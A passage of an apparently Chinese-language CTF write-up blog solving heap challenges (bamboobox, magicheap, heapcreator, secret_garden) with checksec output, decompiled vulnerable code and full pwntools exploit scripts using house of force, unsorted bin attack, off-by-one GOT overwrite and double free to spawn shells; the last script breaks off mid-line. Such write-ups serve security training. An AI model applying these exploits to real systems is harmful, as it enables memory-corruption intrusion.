<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) <span class="comment">#prev_size</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x41</span>) <span class="comment">#size</span></span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x18</span>) <span class="comment">#fd</span></span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x10</span>) <span class="comment">#bk</span></span><br><span class="line">fake_chunk += <span class="string">&quot;c&quot;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><strong>3.EXP-2</strong></li>
</ul>
<p><strong>house of force</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">length,context</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,context</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#house of force</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"></span><br><span class="line">magic=elf.sym[<span class="string">&#x27;magic&#x27;</span>]</span><br><span class="line">malloc_size = -(<span class="number">0x40</span> + <span class="number">0x20</span>)-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">alloc(malloc_size,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="hitcontraining_magicheap"><a class="markdownIt-Anchor" href="#hitcontraining_magicheap"></a> hitcontraining_magicheap</h2>
<p><strong>Unsorted_Bin_Attack</strong></p>
<blockquote>
<p>控制 Unsorted Bin Chunk 的 bk 指针</p>
</blockquote>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(text))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>back_door</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">l33t</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>edit_heap</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>, (<span class="type">char</span> *)&amp;v1 + <span class="number">4</span>, v1);</span><br><span class="line"> read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v1 + <span class="number">4</span>, <span class="number">8uLL</span>);</span><br><span class="line"> v2 = atoi((<span class="type">const</span> <span class="type">char</span> *)&amp;v1 + <span class="number">4</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>, (<span class="type">char</span> *)&amp;v1 + <span class="number">4</span>, v1);</span><br><span class="line"> read_input(heaparray[(<span class="type">signed</span> <span class="type">int</span>)v1], v2);</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>未控制边堆溢出</p>
</blockquote>
<ul>
<li><strong>3.EXP</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">l33t = <span class="number">0x6020A0</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line">	edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(l33t-<span class="number">0x13</span>)) <span class="comment">#&lt;--控制bk指针</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#3 fake_chunk</span></span><br><span class="line">	edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1305</span>))</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么是p64(l33t-0x13)？</p>
<blockquote>
<p>经过动态调试得该处是unsorted bin链表</p>
</blockquote>
<p>为什么edit(3,‘a’*8)？</p>
<blockquote>
<p>覆写magic的值为‘0x6161616161616161从而进入后门</p>
</blockquote>
</blockquote>
<h2 id="hitcontraining_heapcreator"><a class="markdownIt-Anchor" href="#hitcontraining_heapcreator"></a> hitcontraining_heapcreator</h2>
<p><strong>Off_By_One</strong></p>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<p>日常增删查改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineaftr(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>edit</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>, &amp;buf);</span><br><span class="line">    read_input(*((_QWORD *)heaparray[v1] + <span class="number">1</span>), *(_QWORD *)heaparray[v1] + <span class="number">1LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>人为的多读取了一个字节(off by one使得我们可以控制下一个<code>chunk</code>的<code>size</code>,再得到`libc base 最后改free为system</p>
</blockquote>
<ul>
<li><strong>3.EXP</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./heapcreator&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29082</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineaftr(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x41&#x27;</span>) <span class="comment">#&lt;-off by one</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">&quot;free&quot;</span>]))</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	leak=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	base=leak-libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">	sys_addr = base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">&quot;leak addr=&gt;0x%x&quot;</span>,leak)</span><br><span class="line">	log.success(<span class="string">&quot;libc base=&gt;0x%x&quot;</span>,base)</span><br><span class="line">	log.success(<span class="string">&quot;system addr=&gt;0x%x&quot;</span>,sys_addr)</span><br><span class="line"></span><br><span class="line">	edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="hitcontraining_secret_garden"><a class="markdownIt-Anchor" href="#hitcontraining_secret_garden"></a> hitcontraining_secret_garden</h2>
<p><strong>Double_Free</strong></p>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<p>原来的菜单有很多无用的函有用的就两个</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">lenght,name,color</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(lenght))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,color)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>back_door</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>3.EXP</strong></li>
</ul>
<p>原版EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;training.pwnable.tw&quot;</span></span><br><span class="line">port = <span class="number">11012</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(host,port)</span></span><br><span class="line">r = process(<span class="string">&quot;./secretgarden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raiseflower</span>(<span class="params">length,name,color</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">&quot;da&quot;</span>,<span class="string">&quot;red&quot;</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">&quot;da&quot;</span>,<span class="string">&quot;red&quot;</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,p64(fake_chunk),<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">&quot;da&quot;</span>,<span class="string">&quot;red&quot;</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">&quot;da&quot;</span>,<span class="string">&quot;red&quot;</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">6</span> + p64(<span class="number">0</span>) + 